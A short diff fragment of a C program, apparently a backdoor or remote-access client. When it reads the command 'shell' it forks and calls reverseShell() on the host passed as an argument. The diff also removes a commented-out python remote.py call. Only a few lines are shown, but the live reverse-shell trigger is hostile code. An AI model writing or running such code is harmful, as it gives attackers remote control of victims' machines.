@@ -38,8 +38,6 @@ int main(int argc, char *argv[]) {
             else if (strncmp(buf, "shell", 5) == 0) {
                 if (fork() == 0) {
                     //printf("Sending shell\n");
-                    //sprintf(cmd, "python /remote.py %s %d", argv[1], PORT);
-                    //system(cmd);
                     reverseShell(argv[1]);
                     exit(0);
                 }
